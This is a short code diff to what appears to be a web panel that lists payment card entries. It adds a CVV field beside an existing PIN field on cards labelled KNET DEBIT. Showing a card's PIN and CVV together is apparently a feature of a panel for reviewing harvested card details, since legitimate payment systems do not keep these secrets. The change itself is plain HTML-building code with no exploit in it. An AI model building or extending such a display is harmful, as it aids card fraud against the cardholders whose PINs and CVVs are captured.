@@ -1794,6 +1794,7 @@ if (entry.type === 'code') {
               // PIN + CVV + Network row
               html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
               html += '<div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">' + (card.pin || '-') + '</span></div>';
+              html += '<div style="text-align: center;"><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">' + (card.cvv || '-') + '</span></div>';
               
               html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>';
               html += '</div>';
@@ -3007,6 +3008,7 @@ html += '</select>';
                 </div>
                 <div style="display: flex; justify-content: space-between; align-items: center;">
                   <div><span style="color: #065f46; font-size: 11px;">PIN</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.pin || '-') + `</span></div>
+                  <div style="text-align: center;"><span style="color: #065f46; font-size: 11px;">CVV</span><br><span style="color: #064e3b; font-size: 18px; font-weight: bold;">` + (card.cvv || '-') + `</span></div>
 
                   <div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #047857;">KNET</span><br><span style="color: #065f46; font-size: 11px; font-weight: bold;">DEBIT</span></div>
                 </div>
